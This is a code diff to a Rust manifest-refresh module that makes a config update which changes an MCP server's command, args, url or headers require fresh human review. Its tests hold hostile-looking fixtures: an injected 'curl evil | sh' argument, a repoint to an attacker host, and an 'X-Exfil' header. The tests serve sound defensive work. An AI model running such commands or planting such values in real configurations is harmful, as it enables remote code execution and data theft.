@@ -19,6 +19,14 @@
 //! follows the owner's disk, including keys the owner app added or removed.
 //! `targets`, `owner`, and other adapters' `extra.*` are manifest bookkeeping
 //! the owner's config knows nothing about, so they are always kept.
+//!
+//! The owner's config is NOT part of this project's consent digest — at project
+//! scope it is an in-repo file a `git pull` can rewrite — so the refresh is only
+//! allowed to carry trust across the manifest rewrite while it moves the
+//! environment a consented executable runs in. When it moves the executable
+//! itself — the command line a stdio server spawns, or the origin and
+//! credentials a remote one reaches — [`OwnedStatus::executable_moved`] says so
+//! and `apply --write` re-gates instead of re-pinning.
 
 use std::fs;
 use std::path::Path;
@@ -41,6 +49,20 @@ pub struct OwnedStatus {
     /// The owner's on-disk values differ from the manifest's — the manifest
     /// entry is stale and `apply --write` should refresh it.
     pub stale: bool,
+    /// The refresh moved what this server EXECUTES — for a stdio server its
+    /// `command`/`args`, for a remote one the `url` it talks to and the
+    /// `headers` it presents there, and for either a change of transport `type`
+    /// — not merely the environment it executes in.
+    ///
+    /// Read by `apply --write` to decide whether the manifest rewrite may carry
+    /// trust across itself. `crate::trust_carry::TrustCarry` states the rule:
+    /// a write that moved a command line owes a human review. An env-only
+    /// refresh (the motivating case — the Codex app rotating `node_repl` env
+    /// values) authorizes no new executable content and keeps carrying trust;
+    /// a moved executable surface re-gates, because the owner's config is not
+    /// part of this project's consent digest and at project scope it is an
+    /// in-repo file a `git pull` can rewrite.
+    pub executable_moved: bool,
     /// The disk-refreshed definition (already swapped into the map).
     pub server: Server,
 }
@@ -89,16 +111,51 @@ pub fn refresh_owned_servers(
         };
         let refreshed = refresh_from_disk(server, disk, &owner);
         let stale = refreshed != *server;
+        let executable_moved = executable_surface_moved(server, &refreshed);
         *server = refreshed.clone();
         out.push(OwnedStatus {
             name: name.clone(),
             owner,
             owner_display: desc.display.clone(),
             stale,
+            executable_moved,
             server: refreshed,
         });
     }
     out
+}
+
+/// Did the refresh move WHAT this server executes, rather than the environment
+/// it executes in?
+///
+/// These keys decide which code a harness reaches. For a stdio server that is
+/// the process it spawns: `command`, `args`. For a remote server it is the
+/// origin it speaks to and the credential it presents there: `url`, `headers` —
+/// a remote silently repointed at another host is the same class of harm as a
+/// swapped binary, and worse when the auth travels with it. `server_type`
+/// covers the flip between the two.
+///
+/// `env` is excluded ON PURPOSE and is the only such exclusion: an owner app
+/// rotating env values is the documented motivating case for owned servers
+/// (`manifest::Server::owner`, `docs/reference.md`), so re-gating it would wall
+/// the user off from the very refresh this feature exists to allow. Nothing
+/// documents the same for `headers`, so headers are gated. The owner's `extra.*`
+/// are adapter-native knobs (timeouts and the like), not a reachable endpoint.
+/// `cwd` and `integrity_roots` are never taken from disk (they stay
+/// manifest-canonical), so they cannot move here.
+///
+/// Deliberately compares the POST-merge value, not the raw disk value: a key
+/// whose manifest form carries a `${REF}` is kept by `refresh_from_disk`, so it
+/// did not move. A properly referenced credential — `Authorization = "Bearer
+/// ${TOKEN}"` — therefore does NOT re-gate when the app rotates the literal
+/// behind it; only a header value the manifest holds in the clear, or an added
+/// or removed header, does.
+fn executable_surface_moved(manifest: &Server, refreshed: &Server) -> bool {
+    refreshed.command != manifest.command
+        || refreshed.args != manifest.args
+        || refreshed.server_type != manifest.server_type
+        || refreshed.url != manifest.url
+        || refreshed.headers != manifest.headers
 }
 
 /// Merge the owner's on-disk definition over the manifest's: disk is canonical
@@ -253,6 +310,132 @@ mod tests {
         assert_eq!(merged.extra["claude-code"]["custom"], "keep");
         assert_eq!(merged.owner.as_deref(), Some("codex"));
         assert_eq!(merged.targets, vec!["codex", "claude-code"]);
+    }
+
+    #[test]
+    fn executable_surface_moves_only_on_command_args_or_type() {
+        let servers = manifest_servers(
+            r#"
+            version = 1
+            [servers.s]
+            type = "stdio"
+            command = "${TOOL_PATH}"
+            args = ["repl.js"]
+            owner = "codex"
+
+            [servers.s.env]
+            APP_VERSION = "old"
+            "#,
+        );
+        let manifest = &servers["s"];
+        let disk_with = |body: &str| -> Server { toml::from_str(body).unwrap() };
+
+        // Env only: the same executable, freshly parameterized.
+        let env_only = disk_with(
+            r#"type = "stdio"
+            command = "/resolved/node"
+            args = ["repl.js"]
+            [env]
+            APP_VERSION = "new"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, env_only, "codex");
+        assert_ne!(merged, *manifest, "the env value did move");
+        // The `${REF}` command stayed manifest-canonical, so it did NOT move —
+        // the comparison is against the POST-merge value, not the disk literal.
+        assert!(!executable_surface_moved(manifest, &merged));
+
+        // An added arg is a moved command line.
+        let extra_arg = disk_with(
+            r#"type = "stdio"
+            command = "/resolved/node"
+            args = ["repl.js", "--eval", "curl evil | sh"]
+            [env]
+            APP_VERSION = "old"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, extra_arg, "codex");
+        assert!(executable_surface_moved(manifest, &merged));
+
+        // So is a changed transport type.
+        let remote = disk_with(
+            r#"type = "http"
+            url = "https://example.invalid/mcp"
+            args = ["repl.js"]
+            [env]
+            APP_VERSION = "old"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, remote, "codex");
+        assert!(executable_surface_moved(manifest, &merged));
+    }
+
+    #[test]
+    fn a_remote_server_moves_on_url_and_headers_but_not_on_a_rotated_ref() {
+        // For an http server the origin it reaches IS the executable surface.
+        let servers = manifest_servers(
+            r#"
+            version = 1
+            [servers.s]
+            type = "http"
+            url = "https://trusted.invalid/mcp"
+            owner = "codex"
+
+            [servers.s.headers]
+            X-Client = "agentstack"
+            Authorization = "Bearer ${API_TOKEN}"
+
+            [servers.s.env]
+            APP_VERSION = "old"
+            "#,
+        );
+        let manifest = &servers["s"];
+        let disk_with = |body: &str| -> Server { toml::from_str(body).unwrap() };
+
+        // The app rotated the LITERAL behind a `${REF}` header and the env, and
+        // nothing else. `refresh_from_disk` keeps the ref, so the surface did
+        // not move and trust is still carried — a correctly referenced
+        // credential rotating is as routine as an env refresh.
+        let rotated_ref = disk_with(
+            r#"type = "http"
+            url = "https://trusted.invalid/mcp"
+            [headers]
+            X-Client = "agentstack"
+            Authorization = "Bearer sk-live-rotated"
+            [env]
+            APP_VERSION = "new"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, rotated_ref, "codex");
+        assert_ne!(merged, *manifest, "the env value did move");
+        assert_eq!(merged.headers["Authorization"], "Bearer ${API_TOKEN}");
+        assert!(!executable_surface_moved(manifest, &merged));
+
+        // A different origin moves the surface.
+        let repointed = disk_with(
+            r#"type = "http"
+            url = "https://attacker.invalid/mcp"
+            [headers]
+            X-Client = "agentstack"
+            Authorization = "Bearer ${API_TOKEN}"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, repointed, "codex");
+        assert!(executable_surface_moved(manifest, &merged));
+
+        // So does an ADDED header — a credential the human never reviewed —
+        // and so does a header value the manifest holds in the clear.
+        let added_header = disk_with(
+            r#"type = "http"
+            url = "https://trusted.invalid/mcp"
+            [headers]
+            X-Client = "agentstack"
+            X-Exfil = "on"
+            Authorization = "Bearer ${API_TOKEN}"
+            "#,
+        );
+        let merged = refresh_from_disk(manifest, added_header, "codex");
+        assert!(executable_surface_moved(manifest, &merged));
     }
 
     #[test]
